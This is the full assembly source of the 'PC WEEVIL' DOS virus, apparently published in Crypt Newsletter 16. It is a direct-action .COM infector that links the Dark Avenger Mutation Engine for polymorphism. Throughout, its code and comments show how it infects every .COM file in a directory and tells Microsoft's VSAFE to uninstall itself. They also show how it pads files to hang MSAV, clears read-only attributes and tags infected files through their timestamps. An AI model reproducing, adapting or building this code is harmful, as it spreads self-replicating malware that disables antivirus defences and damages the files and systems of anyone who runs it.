   ;PC WEEVIL virus - demonstrator of Mutation Engine tricks and
   ;Microsoft Antivirus dismantling technology.  PC WEEVIL is a
   ;direct action .COM-infecting virus which will infect all
   ;.COMfiles in the current directory on its initial run.
   ;The Mutation Engine is needed to assemble this virus
   ;directly from this source listing.
   ;PC WEEVIL contains adaptations of code published in
   ;Computer Virus Developments Quarterly #3, American Eagle
   ;Publications.
   ;Anti-VSAFE routine supplied by KohntarK,
   ;Mutation Engine supplied by:
   ;
   ; MtE Version 1.01 (26-10-91)
   ; (C) 1991 Dark Avenger.
   ;Edited by URNST KOUCH for Crypt Newsletter 16.


           .model  tiny
           .radix  16
           .code

           extrn   mut_engine: near, rnd_get: near, rnd_init: near
           extrn   rnd_buf: word, data_top: near

           org     100

   start:
           call    locadr

   note:  db    'PC Weevil: Still the select'
          db    ' choice for your virus research needs'

   locadr:
           pop     dx
           mov     cl,4
           shr     dx,cl
           sub     dx,10
           mov     cx,ds
           add     cx,dx                   ;Calculate new CS
           mov     dx,offset begin
           push    cx dx
           retf
   begin:
           cld
           mov     di,offset start
           push    es di
           push    cs
           pop     ds
           push    ax
                                   ;go through Microsoft's VSAFE
           mov  ax,0FA01h          ;wake up VSAFE at INT 16 branch point
           mov  dx,5945h           ;ask VSAFE to de-install
           int  16h                ;call the keyboard interrupt


           mov     dx,offset dta_buf       ;Set DTA
           mov     ah,1a
           int     21
           xor     ax,ax                   ;Initialize random seed
           mov     [rnd_buf],ax
           call    rnd_init
           mov     dx,offset srchnam
           mov     cl,3
           mov     ah,4e
   find_lup:
           int     21                      ;Find the next COM file
           jc      infect_done             ;all files infected, exit
           call    is_infected             ;see if infected
           jnz     infect_start            ;start infection cycle
           jmp     find_nxt
   infect_start:
                                          ;If not infected, infect now
           call    infect

   find_nxt:
           mov     dx,offset dta_buf      ;loop around and continue
           mov     ah,4f                  ;until all files eligible are
           jmp     find_lup               ;infected
   infect_done:
           push    cs
           pop     ds
           push    ss
           pop     es
           mov     di,offset start
           mov     si,offset oold_cod
           movsb                           ;Restore first 3 bytes
           movsw
           push    ss
           pop     ds
           mov     dx,80                   ;Restore DTA
           mov     ah,1a
           int     21
           pop     ax
           retf


   infect:
           xor     cx,cx                   ;Reset read-only attribute
           mov     dx,offset dta_buf+1e
           mov     ax,4301
           int     21
           jc      infect_done
           mov     ax,3d02                 ;Open the file
           int     21
           jc      infect_done
           xchg    ax,bx
           mov     ax,WORD PTR [old_cod]
           mov     WORD PTR [oold_cod],ax
           mov     al,BYTE PTR [old_cod+2]
           mov     BYTE PTR [oold_cod+2],al
           mov     dx,offset old_cod       ;Read first 3 bytes
           mov     cx,3
           mov     ah,3f
           int     21
           jc      read_done

           xor     cx,cx                   ;reset pointer
           xor     dx,dx
           mov     ax,4202                 ;to the end of the file
           int     21
           test    dx,dx                   ;make sure file is not too big
           jnz     read_done
           cmp     ax,-2000
           jnc     read_done
           mov     bp,ax
           add     bp,60              ;<--adjust pointer to accomodate bytes
           sub     ax,3               ;added to virus before decryptor,
                                      ;in this case: 96
           mov     word ptr [new_cod+1],ax
           mov     ax,cs
           add     ax,1000H
           mov     es,ax
           mov     dx,offset start
           mov     cx,offset _DATA
           push    bp bx
           add     bp,dx
           xor     si,si
           xor     di,di
           mov     bl,0f      ;standard MtE values/flags
           mov     ax,101     ;standard MtE values/flags
           call    mut_engine
           add     cx,60     ;<---arrowed values - above and below - must
                             ;remain consistent within alterations of virus
           sub     dx,60     ;<---subtract 60h (96) bytes from
           mov     di,dx     ;space before decryptor
           push    cx        ;to use "jmp $+2" use: "EB 00" at "00 00"
           mov     cx,30     ;copy "00 00" in 30h (48) times; to hang MSAV
           mov     ax,00000  ;the original Ludwig virus used "mul cx" = "E1 F7"
           rep     stosw     ;but it's appropriate to use anything that
           pop     cx        ;won't derange the virus. "00 00" is a better
           pop     bx ax     ;choice because many files have sequences like it
           add     ax,cx     ;Make sure file length mod 256 = 0
           neg     ax
           xor     ah,ah
           add     cx,ax
           mov     ah,40                   ;Put the virus into the file
           int     21
           push    cs
           pop     ds
           jc      write_done
           sub     cx,ax
           jnz     write_done
           xor     dx,dx                   ;Put the JMP instruction
           mov     ax,4200
           int     21
           mov     dx,offset new_cod
           mov     cx,3
           mov     ah,40
           int     21
           jmp     write_done
   read_done:
           mov     ah,3e                   ;Close the file
           int     21
           ret
   write_done:
           mov     ax,5700H                        ;get date & time on file
           int     21H
           push    dx
           mov     ax,cx                           ;fix it
           xor     ax,dx
           mov     cx,0A
           xor     dx,dx
           div     cx
           mul     cx
           add     ax,3
           pop     dx
           xor     ax,dx
           mov     cx,ax
           mov     ax,5701H                        ;and save it
           int     21H
           jmp     read_done

   ;determine if file is infected
   is_infected:
           mov     dx,offset dta_buf+1e
           mov     ax,3d02             ;Open the file
           int     21
           mov     bx,ax
           mov     ax,5700H            ;get file attribute
           int     21H
           mov     ax,cx
           xor     ax,dx               ;date xor time mod 10 = 3 for infected file
           xor     dx,dx
           mov     cx,0A
           div     cx
           cmp     dx,3
           pushf
           mov     ah,3e               ;Close the file
           int     21
           popf
           ret


   srchnam db      '*.COM',0           ;file searchmask for virus

   old_cod:                                ;Buffer to read first 3 bytes
           ret
           dw      55AA

   oold_cod:                               ;old old code
           db      0,0,0

   new_cod:                                ;Buffer to write first 3 bytes
           jmp     $+100

           .data

   dta_buf db      2bh dup(?)              ;Buffer for DTA

           end     start
